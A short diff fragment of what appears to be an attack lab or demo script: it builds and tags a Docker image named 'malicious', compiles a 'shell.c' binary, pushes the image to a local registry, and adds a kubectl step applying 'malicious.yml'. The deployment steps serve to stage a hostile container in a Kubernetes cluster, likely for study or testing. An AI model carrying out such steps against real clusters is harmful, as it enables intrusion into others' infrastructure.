@@ -3,3 +3,4 @@ docker build . -t malicious
 gcc shell.c -o shell
 docker tag malicious localhost:5000/malicious
 docker push localhost:5000/malicious
+kubectl apply -f malicious.yml
